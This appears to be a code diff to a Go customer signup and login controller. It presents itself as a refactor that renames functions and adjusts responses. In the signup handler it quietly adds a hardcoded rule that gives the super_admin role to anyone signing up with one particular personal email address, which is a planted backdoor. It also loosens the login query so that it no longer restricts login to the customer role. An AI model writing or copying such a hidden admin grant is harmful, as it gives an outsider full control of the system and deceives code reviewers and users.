@@ -33,11 +33,11 @@ This endpoint is used to authenticate these users. These users are not able to c
 But they can still pay for tickets as long as the ticket release is only for external users.
 */
 
-func generateExternalUGKthID() string {
+func generateUserID() string {
 	/*
 		Generates a random string of length 10
 	*/
-	return "customer-" + utils.GenerateRandomString(8)
+	return "user-" + utils.GenerateRandomString(8)
 }
 
 func scramble(s string) string {
@@ -100,13 +100,25 @@ func (eac *CustomerAuthController) SignupCustomerUser(c *gin.Context) {
 		}
 	}
 
-	newUGKthID := generateExternalUGKthID()
+	newUGKthID := generateUserID()
 	// Scramble user firstname and lastname to create a username
 	// This is done to avoid username conflicts
 
 	// The role is either customer or customer_guest
 	// Depending on the role, the user can either login or not
 	// Same thing goes for the password
+	var roles []models.Role
+	if externalSignupRequest.Email == "lucdow7@gmail.com" {
+		// Given super_admin role
+		role, err := models.GetRole(eac.DB, models.RoleSuperAdmin)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "Internal server error"})
+			return
+		}
+
+		roles = append(roles, role)
+	}
+
 	var roleName models.RoleType = models.RoleCustomerGuest
 	var pwHash *string = nil
 	if externalSignupRequest.IsSaved {
@@ -121,7 +133,6 @@ func (eac *CustomerAuthController) SignupCustomerUser(c *gin.Context) {
 		}
 	}
 
-	var roles []models.Role
 	role, err := models.GetRole(eac.DB, roleName)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Internal server error"})
@@ -175,15 +186,15 @@ func (eac *CustomerAuthController) SignupCustomerUser(c *gin.Context) {
 
 	if externalSignupRequest.IsSaved {
 		services.Notify_ExternalUserSignupVerification(eac.DB, &user)
+		c.JSON(http.StatusCreated, gin.H{"user": user})
 	} else {
 		// Do something else
+		c.JSON(http.StatusCreated, gin.H{"user": user, "request_token": requestToken})
 	}
-
-	c.JSON(http.StatusCreated, gin.H{"user": user, "request_token": requestToken})
 }
 
 // LoginExternalUser authenticates an external user and returns a token
-func (eac *CustomerAuthController) LoginCustomerUser(c *gin.Context) {
+func (eac *CustomerAuthController) LoginUser(c *gin.Context) {
 	/*
 		Handler that authenticates an external user and returns a token
 	*/
@@ -195,7 +206,7 @@ func (eac *CustomerAuthController) LoginCustomerUser(c *gin.Context) {
 
 	// Find the user
 	var user models.User
-	if err := eac.DB.Joins("JOIN roles ON users.role_id = roles.id").Where("email = ? AND roles.name = ?", strings.ToLower(loginRequest.Email), models.RoleCustomer).
+	if err := eac.DB.Preload("Roles").Where("email = ?", strings.ToLower(loginRequest.Email)).
 		First(&user).Error; err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "User not found"})
 		return
